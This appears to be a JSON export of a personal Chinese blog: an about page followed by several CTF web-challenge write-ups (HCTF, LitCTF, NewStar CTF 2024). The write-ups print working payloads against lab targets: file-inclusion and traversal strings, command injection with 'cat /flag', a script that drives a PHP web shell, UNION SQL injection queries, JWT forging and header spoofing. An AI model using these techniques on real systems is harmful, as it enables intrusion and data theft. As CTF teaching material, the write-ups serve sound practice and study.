{"/about/":{"data":{"":"","#":"","如果有一天#如果有一天…":"","快问快答#快问快答":"\n吴海隆 就读于： 太原理工大学 软件工程 邮箱： puppy1599@outlook.com 签名： 于道各努力，千里自同风 致谢 致我深爱的她 在这段追梦的旅途中，我最想感谢的是你。\n你像夜里的一束光，在我最焦虑、最孤独、最失落的时候，温柔地照亮我。\n当我被卡在代码的一行死循环时，是你的鼓励让我坚持下去；\n当我因为项目失败而怀疑自己时，是你的耐心与理解让我重新相信自己。\n愿我用未来所有的温柔与坚韧，回应你曾给予我的无限爱意。\n“你的名字，是我写过最温柔的代码。”\n致我亲爱的父母 感谢你们无条件的支持与信任，\n从我踏上编程这条道路开始，你们就给了我最大的自由与鼓励。\n或许你们不懂我写的每一行代码，不懂我学习到深夜的原因，\n但你们从来没有阻拦，只是把热好的饭菜放在桌上，把“早点休息”放在微信里。\n你们的理解，是我走到今天最大的底气。\n你们的爱，是我人生中最温柔的 buffer。\n愿我写下的每一行代码，\n都能回报我爱的人，和爱我的人。\n我的状态 编程技能： █████████░░░ 90%\n安全研究： ███████░░░░░ 70%\n熬夜抗性： ██████████ 100%\n耐心调 Bug： ████████░░░░ 80%\n对她的喜欢： █████████████ 200%\n技术栈 🐍\nPython\r⚙️\nGo\r💻\nC++\r🌐\nHugo\r我的成长路径 2024：进入太原理工大学 2025：使用 Hugo 搭建博客 “摸鱼小窝” 现在在做什么？ 深度学习网络安全 最近在读 《Hello 算法 》— 靳宇栋 最近在听 《唯一》— 邓紫棋 如果有一天… 如果有一天，我不再做开发者了，\n那我可能会开一家书屋，养一只猫，晒晒太阳，\n晚上写博客、做做饭，偶尔为她写一封信。\n但现在，我更想把青春献给热爱的技术，\n和那个愿意陪我熬夜 debug 的人。\n快问快答 Q：最喜欢的编程语言？\nA：Go，极简而强大。\nQ：你相信什么？\nA：努力不会被辜负，但情感更值得珍惜。\nQ：你理想的生活？\nA：有人爱，有事做，有所期待。\n感谢你愿意了解我，愿我们都能用热爱创造世界。","我的成长路径#我的成长路径":"","我的状态#我的状态":"","技术栈#技术栈":"","最近在听#最近在听":"","最近在读#最近在读":"","现在在做什么#现在在做什么？":"","致谢#致谢":""},"title":"关于"},"/blog/":{"data":{"":"\rRSS 订阅 "},"title":"博客"},"/blog/ctf-write-up/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021webftp/":{"data":{"":"使用 dirsearch 扫描，发现 /phpinfo.php ┌──(hailo㉿kali-Hailo)-[~] └─$ dirsearch -u 'http://node4.anna.nssctf.cn:28342/?m=login\u0026a=in' /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/hailo/reports/http_node4.anna.nssctf.cn_28342/__25-05-02_10-32-14.txt Target: http://node4.anna.nssctf.cn:28342/ [10:32:14] Starting: [10:32:21] 301 - 335B - /.git -\u003e http://node4.anna.nssctf.cn:28342/.git/ [10:32:21] 200 - 415B - /.git/branches/ [10:32:21] 200 - 306B - /.git/config [10:32:21] 200 - 623B - /.git/ [10:32:21] 200 - 73B - /.git/description [10:32:21] 200 - 23B - /.git/HEAD [10:32:21] 200 - 658B - /.git/hooks/ [10:32:21] 200 - 464B - /.git/info/ [10:32:21] 200 - 240B - /.git/info/exclude [10:32:21] 200 - 173B - /.git/logs/HEAD [10:32:21] 301 - 345B - /.git/logs/refs -\u003e http://node4.anna.nssctf.cn:28342/.git/logs/refs/ [10:32:21] 301 - 351B - /.git/logs/refs/heads -\u003e http://node4.anna.nssctf.cn:28342/.git/logs/refs/heads/ [10:32:21] 200 - 488B - /.git/logs/ [10:32:21] 200 - 173B - /.git/logs/refs/heads/master [10:32:21] 200 - 173B - /.git/logs/refs/remotes/origin/HEAD [10:32:21] 200 - 566B - /.git/objects/ [10:32:21] 301 - 353B - /.git/logs/refs/remotes -\u003e http://node4.anna.nssctf.cn:28342/.git/logs/refs/remotes/ [10:32:21] 301 - 360B - /.git/logs/refs/remotes/origin -\u003e http://node4.anna.nssctf.cn:28342/.git/logs/refs/remotes/origin/ [10:32:21] 200 - 41B - /.git/refs/heads/master [10:32:21] 200 - 114B - /.git/packed-refs [10:32:21] 200 - 481B - /.git/refs/ [10:32:21] 200 - 33KB - /.git/index [10:32:21] 301 - 346B - /.git/refs/heads -\u003e http://node4.anna.nssctf.cn:28342/.git/refs/heads/ [10:32:21] 301 - 348B - /.git/refs/remotes -\u003e http://node4.anna.nssctf.cn:28342/.git/refs/remotes/ [10:32:21] 301 - 355B - /.git/refs/remotes/origin -\u003e http://node4.anna.nssctf.cn:28342/.git/refs/remotes/origin/ [10:32:21] 200 - 32B - /.git/refs/remotes/origin/HEAD [10:32:21] 301 - 345B - /.git/refs/tags -\u003e http://node4.anna.nssctf.cn:28342/.git/refs/tags/ [10:32:21] 403 - 301B - /.ht_wsr.txt [10:32:21] 403 - 304B - /.htaccess.bak1 [10:32:21] 403 - 304B - /.htaccess.orig [10:32:21] 403 - 306B - /.htaccess.sample [10:32:21] 403 - 304B - /.htaccess.save [10:32:21] 403 - 302B - /.htaccess_sc [10:32:21] 403 - 304B - /.htaccess_orig [10:32:21] 403 - 303B - /.htaccessOLD2 [10:32:21] 403 - 305B - /.htaccess_extra [10:32:21] 403 - 302B - /.htaccessOLD [10:32:21] 403 - 302B - /.htaccessBAK [10:32:21] 403 - 294B - /.htm [10:32:21] 403 - 295B - /.html [10:32:21] 403 - 300B - /.htpasswds [10:32:21] 403 - 304B - /.htpasswd_test [10:32:21] 403 - 301B - /.httr-oauth [10:32:22] 403 - 295B - /.php3 [10:32:22] 403 - 294B - /.php [10:32:32] 403 - 298B - /cgi-bin/ [10:32:32] 403 - 306B - /cgi-bin/awstats/ [10:32:32] 403 - 316B - /cgi-bin/a1stats/a1disp.cgi [10:32:32] 403 - 308B - /cgi-bin/awstats.pl [10:32:32] 403 - 309B - /cgi-bin/htimage.exe?2,2 [10:32:32] 403 - 308B - /cgi-bin/htmlscript [10:32:32] 403 - 308B - /cgi-bin/index.html [10:32:32] 403 - 310B - /cgi-bin/imagemap.exe?2,2 [10:32:32] 403 - 303B - /cgi-bin/login [10:32:32] 403 - 307B - /cgi-bin/login.php [10:32:32] 403 - 315B - /cgi-bin/mt7/mt-xmlrpc.cgi [10:32:32] 403 - 307B - /cgi-bin/mt/mt.cgi [10:32:32] 403 - 307B - /cgi-bin/login.cgi [10:32:32] 403 - 311B - /cgi-bin/mt-xmlrpc.cgi [10:32:32] 403 - 308B - /cgi-bin/mt7/mt.cgi [10:32:32] 403 - 305B - /cgi-bin/php.ini [10:32:32] 403 - 306B - /cgi-bin/printenv [10:32:32] 403 - 309B - /cgi-bin/ViewLog.asp [10:32:32] 403 - 304B - /cgi-bin/mt.cgi [10:32:32] 403 - 309B - /cgi-bin/printenv.pl [10:32:32] 403 - 306B - /cgi-bin/test-cgi [10:32:32] 403 - 306B - /cgi-bin/test.cgi [10:32:32] 403 - 314B - /cgi-bin/mt/mt-xmlrpc.cgi [10:32:40] 200 - 10KB - /LICENSE [10:32:41] 200 - 14KB - /logo [10:32:44] 200 - 18KB - /phpinfo.php [10:32:46] 200 - 3KB - /README.md [10:32:46] 301 - 337B - /Readme -\u003e http://node4.anna.nssctf.cn:28342/Readme/ [10:32:47] 403 - 303B - /server-status [10:32:47] 403 - 304B - /server-status/ [10:32:52] 200 - 33KB - /upload Task Completed 发现 flag：NSSCTF{ffb4dc5b-e235-4bb6-b4e2-9db5036124cb}"},"title":"[第五空间 2021]WebFTP"},"/blog/ctf-write-up/actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Binclude/":{"data":{"":"检查页面元素发现提示：\u003cbody\u003e\u003ca href=\"?file=flag.php\"\u003etips\u003c/a\u003e\u003c/body\u003e\n利用 任意文件包含漏洞 和 php 伪协议 读取 `flag.php\n?file=php://filter/read=convert.base64-encode/resource=flag.php 进行 base64 解码，获得 flag：flag{56a53bc6-5778-4ddb-bde2-a8a73ab475ad}\nPD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NTZhNTNiYzYtNTc3OC00ZGRiLWJkZTItYThhNzNhYjQ3NWFkfQo= \u003c?php echo \"Can you find out the flag?\"; //flag{56a53bc6-5778-4ddb-bde2-a8a73ab475ad} "},"title":"[ACTF2020 新生赛]Include"},"/blog/ctf-write-up/hctf-2018warmup/":{"data":{"":"source.php?file=../../../../../../../../ffffllllaaaagggg source.php? flag not here, and flag in ffffllllaaaagggg flag{8855d74e-b6ec-4639-ba3d-7d3d231f9e02}\n\u003c?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026$page) { $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\u003cbr\u003e\u003cimg src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /\u003e\"; } ?\u003e "},"title":"[HCTF 2018]WarmUp"},"/blog/ctf-write-up/litctf-2023ping/":{"data":{"":"检查页面元素，发现 form 的 onsubmit 属性在表单提交时触发 JavaScript 代码，验证用户输入是否是一个合法的 IPv4 地址\nfunction check_ip() { let ip = document.getElementById('command').value; let re = /^(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)$/; if (re.test(ip.trim())) { return true; } alert('敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦'); return false; } 禁用网页 JavaScript，查找 flag 文件：127.0.0.1 \u0026\u0026 find / -iname flag\nPING 127.0.0.1 (127.0.0.1): 56 data bytes 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.065 ms 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.051 ms 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.051 ms 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.057 ms 64 bytes from 127.0.0.1: seq=4 ttl=42 time=0.048 ms 64 bytes from 127.0.0.1: seq=5 ttl=42 time=0.058 ms --- 127.0.0.1 ping statistics --- 6 packets transmitted, 6 packets received, 0% packet loss round-trip min/avg/max = 0.048/0.055/0.065 ms /flag 输出 /flag 内容：127.0.0.1 \u0026\u0026 cat /flag\nPING 127.0.0.1 (127.0.0.1): 56 data bytes 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.057 ms 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.059 ms 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.049 ms 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.059 ms 64 bytes from 127.0.0.1: seq=4 ttl=42 time=0.054 ms 64 bytes from 127.0.0.1: seq=5 ttl=42 time=0.044 ms --- 127.0.0.1 ping statistics --- 6 packets transmitted, 6 packets received, 0% packet loss round-trip min/avg/max = 0.044/0.053/0.059 ms flag=NSSCTF{a1dc7cb6-18e6-4011-868f-929e1834457c} "},"title":"[LitCTF 2023]Ping"},"/blog/ctf-write-up/newstar-ctf-2024/%E8%A5%BF%E7%94%B5-ctf-%E7%BB%88%E7%AB%AF-wsrx/":{"data":{"":"","#":"一、WSRX 的下载与安装 下载地址：WebSocketReflectorX\n二、添加到环境变量 D:\\Application\\WebSocketReflectorX 三、编写 bat 脚本 以 wsrx_ctf.bat 为例，放在 D:\\Application\\WebSocketReflectorX 目录：\n@echo off chcp 65001 set /p wsrx=请输入 WSRX 地址： echo link: 127.0.0.1:3307 wsrx.exe connect %wsrx% --host 127.0.0.1 --port 3307 "},"title":"西电 CTF 终端 WSRX"},"/blog/ctf-write-up/newstar-ctf-2024/week1-web-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/":{"data":{"":"","headach3#headach3":"","pangbai-过家家1#PangBai 过家家（1）":"headach3 提示：My HEAD(er) aches!!!!! HELP ME DOCTOR!!!\n根据提示在响应头中找到 Fl3g，获得 flag{You_Ar3_R3Ally_A_9ooD_d0ctor}\n会赢吗 提示：你考入了咒术高专，但是出门前你因为太兴奋而忘记了带录取通知书，你能找到录取通知书吗？\n检查页面元素：\u003c!-- flag第一部分：ZmxhZ3tXQTB3，开始你的新学期吧！:/4cqu1siti0n --\u003e\nflag 第一部分：ZmxhZ3tXQTB3 下一关地址：/4cqu1siti0n 进入下一关：127.0.0.1:3307/4cqu1siti0n\n提示：五条老师传授给你们一种名为javascript的术式，这种术式可以在控制台进行一系列的应用\n检查页面元素：对 \u003cscript\u003e 进行分析，在控制台调用函数 revealFlag() 并传入参数 **课程名称（classname）**就可以获得第二部分的 flag\n\u003cscript\u003e async function revealFlag(className) { try { const response = await fetch(`/api/flag/${className}`, { method: 'POST', headers: { 'Content-Type': 'application/json' } }); if (response.ok) { const data = await response.json(); console.log(`恭喜你！你获得了第二部分的 flag: ${data.flag}\\n……\\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/${data.nextLevel}`); } else { console.error('请求失败，请检查输入或服务器响应。'); } } catch (error) { console.error('请求过程中出现错误:', error); } } // 控制台提示 console.log(\"你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！\"); \u003c/script\u003e 由 \"你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！\"得到课程名称为 4cqu1siti0n，在控制台调用 revealFlag(4cqu1siti0n)\nflag 第二部分：IV95NF9yM2Fs 下一关地址：/s34l 进入下一关：127.0.0.1:3307/s34l\n检查页面元素：对 \u003cscript\u003e 进行分析，当 id 为 state 的元素中的文本内容为 解封 时，点击按钮 “解封!!!” 就可以获得第二部分的 flag\n\u003cscript\u003e document.addEventListener('DOMContentLoaded', function () { const form = document.getElementById('seal_him'); const stateElement = document.getElementById('state'); const messageElement = document.getElementById('message'); form.addEventListener('submit', async function (event) { event.preventDefault(); if (stateElement.textContent.trim() !== '解封') { messageElement.textContent = '如何是好？'; return; } try { const response = await fetch('/api/flag/s34l', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ csrf_token: document.getElementById('csrf_token').value }) }); if (response.ok) { const data = await response.json(); messageElement.textContent = `第三部分Flag: ${data.flag}, 你解救了五条悟！下一关: /${data.nextLevel || '无'}`; } else { messageElement.textContent = '请求失败，请重试。'; } } catch (error) { messageElement.textContent = '请求过程中出现错误，请重试。'; } }); }); \u003c/script\u003e 找到 \u003cspan id=\"state\"\u003e已封印\u003c/span\u003e 进行编辑，将 已封印 修改为 解封\n点击按钮 “解封!!!”\nflag 第三部分：MXlfR3I0c1B 下一关地址：/Ap3x 进入下一关：127.0.0.1:3307/Ap3x\n检查页面元素：对 \u003cscript\u003e 进行分析，没有发现任何突破点\n\u003cscript\u003e document.querySelector('form').addEventListener('submit', function (event) { event.preventDefault(); alert(\"宿傩的领域太强了，有什么办法让他的领域失效呢？\"); }); (function () { const originalConsoleLog = console.log; console.log = function () { originalConsoleLog.apply(console, arguments); alert(\"你觉得你能这么简单地获取到线索？\"); }; })(); \u003c/script\u003e \u003cnoscript\u003e 定义了在浏览器禁用 JavaScript 或用户的浏览器不支持 JavaScript 时显示的内容\n使用插件 Javascript Toggle On and Off 禁用 JavaScript\n点击按钮 “无量空处！！”\nflag 第四部分：MXlfR3I0c1B 已经是最后一关（\"nextLevel\":null） 将 flag 的所有部分进行拼接，发现 flag{ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9} 并不是答案，尝试对 ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9 进行解码：\nflag关键词：flag 密钥1： 密钥2： 深度：10 初始密文：ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9 解析树： Path ├── Base64 │ └── flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!} └── Base92 最长解密链： Path -\u003e Base64 -\u003e flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!} 最终密文： ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9 最终解密结果： flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!} 发现是 base64 编码，获得 flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}\n智械危机 提示：\nHello! Today is 2025/04/25 welcome to my first website! ROBOTS is protecting this website! But it is not smart enough... It may leak some information to you, future hackers! 根据提示，应该与 robots 有关，使用 dirsearch 进行扫描，发现了 robots.txt\n访问 http://127.0.0.1:3307/robots.txt\nUser-agent: * Disallow: /backd0or.php 访问 http://127.0.0.1:3307/backd0or.php\n\u003c?php function execute_cmd($cmd) { system($cmd); } function decrypt_request($cmd, $key) { $decoded_key = base64_decode($key); $reversed_cmd = ''; for ($i = strlen($cmd) - 1; $i \u003e= 0; $i--) { $reversed_cmd .= $cmd[$i]; } $hashed_reversed_cmd = md5($reversed_cmd); if ($hashed_reversed_cmd !== $decoded_key) { die(\"Invalid key\"); } $decrypted_cmd = base64_decode($cmd); return $decrypted_cmd; } if (isset($_POST['cmd']) \u0026\u0026 isset($_POST['key'])) { execute_cmd(decrypt_request($_POST['cmd'],$_POST['key'])); } else { highlight_file(__FILE__); } ?\u003e 代码审计：存在 Web Shell\n构造参数：cmd 和 key\n使用 Python 编写脚本：\nimport requests import base64 import hashlib url = 'http://127.0.0.1:3307/backd0or.php' decrypted_cmd = 'cat $(find / -iname flag)' cmd = base64.b64encode(decrypted_cmd.encode('utf-8')).decode('utf-8') reversed_cmd = cmd[::-1] decoded_cmd = hashlib.md5(reversed_cmd.encode('utf-8')).hexdigest() key = base64.b64encode(decoded_cmd.encode('utf-8')).decode('utf-8') payload = {'cmd': cmd, 'key': key} response = requests.post(url, data=payload) print(response.text) 获得 flag{6c190201-61b5-3c6b-0a81-5dfa4d1d8cb5}\n谢谢皮蛋 输入 1' 后报错：存在 SQL 注入漏洞（联合查询）\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 0,1' at line 1 判断注入类型：数字型\n1 and 1=1：无报错，查询成功 1 and 1=2：无报错，查询失败 判断列数：\n1 order by 2 判断回显位：\n1 and 1=2 union select 1, 2 爆破库名和版本：\n1 and 1=2 union select database(), version() Name: \"ctf\" Position: \"10.4.13-MariaDB\" 爆破表名：\n1 and 1=2 union select group_concat(table_name), 2 from information_schema.tables where table_schema=database() Name: \"Fl4g,hexo\" Position: \"2\" 爆破列名：\n1 and 1=2 union select group_concat(column_name), 2 from information_schema.columns where table_schema=database() and table_name=\"Fl4g\" Name: \"id,des,value\" Position: \"2\" 爆破数据：\n1 and 1=2 union select group_concat(des), group_concat(value) from Fl4g Name: \"C0ngratu1ati0ns!\" Position: \"flag{NewST@r-CTf-202423f4ac16e193}\" 获得 flag{NewST@r-CTf-202423f4ac16e193}\nPangBai 过家家（1） Level 1：初出茅庐 提示：PangBai 的头部（Header）里便隐藏着一些秘密，需要你主动去发现。\n根据提示检查 response 中的响应头信息，发现 Location 字段中给出了下一 Level 的地址，Location: /da90daff-eac4-438a-8743-dee177700489。\n直接访问 http://127.0.0.1:3307/da90daff-eac4-438a-8743-dee177700489 进入 Level 2。\nLevel 2: 云程发轫 提示：向 PangBai 询问（Query）一下（ask=miao）吧 ~\n根据提示使用 GET 方法（在 URL 加入 ?parameter=value）传入参数 ask=miao，直接访问 http://127.0.0.1:3307/?ask=miao 进入 Level 3。\nLevel 3: 探赜索隐 提示：用另一种方法（Method）打声招呼（say=hello）吧 ~\n常用的 request 方法有 GET 和 POST ，Level 2 使用了 GET 方法，根据提示这次使用 POST 方法传参 say=hello，Content-Type 选择 application/x-www-form-urlencoded 类型。\n劫持请求：\n修改请求：\n进入 Level 4。\nLevel 4: 不悱不发 提示：你需要使用正确的方法（Method）来与 PangBai 沟通。\n由于 302 重定向的原因，此时 request 方法又变成了 GET，使用与 Level 3 相同的 POST 方法重新请求。\nPOST /?ask=miao HTTP/1.1 Host: 127.0.0.1:3307 Sec-Fetch-Mode: navigate Accept-Encoding: gzip, deflate, br, zstd Accept-Language: zh-CN,zh;q=0.9 sec-ch-ua-mobile: ?0 sec-ch-ua: \"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\" Sec-Fetch-Site: none Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 sec-ch-ua-platform: \"Windows\" Sec-Fetch-Dest: document Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-User: ?1 Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NH0.g5672cQm3oc9BNuwUnE1yHl8UZQayXA2N_WDw4JbGQM Content-Type: application/x-www-form-urlencoded say=hello 提示：PangBai 回应了呢！可只有 Papa 的话语才能让她感到安心。 代理人（Agent)，这个委托你就接了吧！\n劫持请求，User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36，根据提示将 Mozilla 修改为 Papa。\n提示：你的话语似乎没有对 PangBai 起效，试着说「玛卡巴卡阿卡哇卡米卡玛卡呣」。\n根据提示将 say=hello 替换为 say=玛卡巴卡阿卡哇卡米卡玛卡呣\n进入 Level 5。\nLevel 5: 渐入佳境 提示：PangBai 依然对你比较警惕，因此「玛卡巴卡阿卡哇卡米卡玛卡呣」或许是不可省略的。\n根据提示，我们仍然需要传递参数 say=玛卡巴卡阿卡哇卡米卡玛卡呣，与 Level 4 相同，由于 302 重定向的原因，需要使用 POST 方法重新请求。\n提示：这里便是 PangBai 的心境了呢！试着解开心结吧 ~ 或许可以尝试用修改（PATCH）的方法提交一个补丁包（name=“file”; filename=\"*.zip\"）试试。\n根据提示，我们需要使用 PATCH 方法提交一个补丁包，这里提供两种方法。\n1、利用 Python 的 requests 模块请求\nimport requests url = 'http://127.0.0.1:3307/?ask=miao' headers = { 'Host': '127.0.0.1:3307', 'Sec-Fetch-Site': 'none', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-ch-ua': '\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"', 'sec-ch-ua-platform': '\"Windows\"', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Mode': 'navigate', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Sec-Fetch-User': '?1', 'User-Agent': 'Papa/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'Accept-Language': 'zh-CN,zh;q=0.9', 'sec-ch-ua-mobile': '?0', 'Cache-Control': 'max-age=0', 'Sec-Fetch-Dest': 'document', 'Cookie': 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NX0.aSNfpRjut2OiqeDG8CdhjCiqv2CensxCWsXEJO_ZSKw', } files = {'file': ('filename.zip', 'nothing to send')} data = {'say': '玛卡巴卡阿卡哇卡米卡玛卡呣'} session = requests.Session() response = session.patch(url, headers=headers, files=files, data=data) with open('response_text/level-5.txt', 'w', encoding='utf-8') as f: f.write(response.text) print('Cookies:', session.cookies) 运行结果：\nRequestsCookieJar[\u003cCookie token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.D84JosG9QpYj69hSrIaH36ofPNNKZwRAyqr2n14y5LI for 127.0.0.1/\u003e]\u003e 在 Console 中使用 document.cookie 更新 cookie 值，刷新后进入 Level 6。\ndocument.cookie = \"token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.D84JosG9QpYj69hSrIaH36ofPNNKZwRAyqr2n14y5LI\" 2、使用 PATCH 方法和 multipart/form-data 内容类型上传文件\nLevel 6: 一方通行 提示：还在等什么？距离成为 PangBai 的亲人（localhost）只有一步之遥了呢！ 这里的前方是一方通行啊！Level 6 可不是容易的！\n根据提示，我们需要通过 伪造请求头 的方式来模拟本地请求的特征，让服务器误以为请求来自 localhost（127.0.0.1）。\n劫持请求，在请求头中添加 X-Forwarded-For: localhost（其他可伪造的请求头有：X-Real-IP、Referer）\n提示：PangBai 以一种难以形容的表情望着你——激动的、怀念的，却带着些不安与惊恐，像落单后归家的雏鸟，又宛若雷暴中遇难的船员。 你似乎无法抵御这种感觉的萦绕，像是一瞬间被推入到无法言喻的深渊。尽管你尽力摆脱，但即便今后夜间偶见酣眠，这一瞬间塑成的梦魇也成为了美梦的常客。 「像■■■■验体■■不可能■■■■ JWT 这种■■ F4invkTHj8bU1BoH ■■■密钥，除非■■■■■走，难道■■■■■■吗？！」 「……」\n推测 F4invkTHj8bU1BoH 是 JWT (JSON Web Tokens) 的密钥，使用密钥可以在 JWT 进行在线签名和验证（获取下一个 Level 的 token）。\n将当前的 token 输入到 Encoded 可以看到里面的数据（这里显示 Invalid Signature 是因为没有输入正确的密钥）。\n经过多次试验发现最后一关并不是 Level 7，而是 Level 0，使用密钥 F4invkTHj8bU1BoH 进行签名，获得 Level 0 的 token。\n在 Console 中使用 document.cookie 更新 cookie 值，刷新后进入 Level 0。\ndocument.cookie = \"token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MH0.7zPrTPLK3ZURtmd34FfByRYPm9a425XdcktwV5hFAvs\" Level 0: 此心安处是吾乡 提示：「PangBai！危险！PangBai！！PangBai！！！」 从梦中醒来\n点击 从梦中醒来 获得 flag{79d688a9-c5f5-61c9-dda1-e101ad562ae4}","会赢吗#会赢吗":"","智械危机#智械危机":"","谢谢皮蛋#谢谢皮蛋":""},"title":"Week1 Web 网络攻防"},"/blog/ctf-write-up/newstar-ctf-2024/week2-web-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/":{"data":{"":"","你能在一秒内打出八句英文吗#你能在一秒内打出八句英文吗":"","复读机#复读机":"遗失的拉链 提示：Pangbai 的拉链找不到了 你可以帮他找到他的拉链吗\n根据提示拉链应该与 zip 有关，这里说拉链找不到了，可以使用 dirsearch 进行目录扫描查找与 zip 相关的内容\npython dirsearch.py -u 127.0.0.1:3307 扫描结果：\n_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: C:\\Users\\puppy\\Desktop\\dirsearch-0.4.3\\reports\\_127.0.0.1_3307\\_25-04-24_09-08-17.txt Target: http://127.0.0.1:3307/ [09:08:18] Starting: [09:08:24] 403 - 276B - /.ht_wsr.txt [09:08:24] 403 - 276B - /.htaccess.save [09:08:24] 403 - 276B - /.htaccess.sample [09:08:24] 403 - 276B - /.htaccess.orig [09:08:24] 403 - 276B - /.htaccess.bak1 [09:08:24] 403 - 276B - /.htaccess_extra [09:08:24] 403 - 276B - /.htaccessBAK [09:08:24] 403 - 276B - /.htaccess_orig [09:08:24] 403 - 276B - /.htaccess_sc [09:08:24] 403 - 276B - /.htaccessOLD2 [09:08:24] 403 - 276B - /.htaccessOLD [09:08:24] 403 - 276B - /.html [09:08:24] 403 - 276B - /.htm [09:08:24] 403 - 276B - /.htpasswd_test [09:08:24] 403 - 276B - /.httr-oauth [09:08:24] 403 - 276B - /.htpasswds [09:08:58] 200 - 861B - /index.html [09:09:17] 200 - 3KB - /server-status/ [09:09:17] 200 - 3KB - /server-status [09:09:32] 200 - 1KB - /www.zip Task Completed 访问 127.0.0.1:3307/www.zip，下载解压后得到 pizwww.php\n\u003c?php error_reporting(0); //for fun if(isset($_GET['new'])\u0026\u0026isset($_POST['star'])){ if(sha1($_GET['new'])===md5($_POST['star'])\u0026\u0026$_GET['new']!==$_POST['star']){ //欸 为啥sha1和md5相等呢 $cmd = $_POST['cmd']; if (preg_match(\"/cat|flag/i\", $cmd)) { die(\"u can not do this \"); } echo eval($cmd); }else{ echo \"Wrong\"; } } 使用 GET 方式传入 new[]=1，POST 方式传入 star[]=2\u0026cmd=system(\"ca$(echo t) /fla$(echo g)\");\n获得 flag：flag{32cba65e-2c30-0a97-726c-fc7317e00cb3}\n你能在一秒内打出八句英文吗 使用 Python 的 request 模块模拟请求\nimport requests from bs4 import BeautifulSoup start_url = \"http://127.0.0.1:3307/start\" submit_url = \"http://127.0.0.1:3307/submit\" session = requests.Session() start_response = session.get(start_url) soup = BeautifulSoup(start_response.text, \"lxml\") element = soup.find('p', {'id': 'text'}) text = element.get_text() payload = {'user_input' : 